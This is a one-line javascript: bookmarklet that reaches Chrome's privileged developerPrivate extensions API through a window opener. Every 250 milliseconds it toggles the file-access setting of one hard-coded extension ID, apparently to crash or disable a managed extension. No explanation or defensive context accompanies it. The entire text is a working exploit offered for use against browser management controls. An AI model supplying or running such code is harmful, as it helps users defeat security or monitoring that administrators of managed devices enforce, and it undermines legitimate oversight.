javascript:let shim = false;var id = ["pabjlbjcgldndnpjnokjakbdofjgnfia"];setInterval(() => {id.forEach((id) => {opener.chrome.developerPrivate.updateExtensionConfiguration({ extensionId: id, fileAccess: shim });});shim = !shim;}, 250);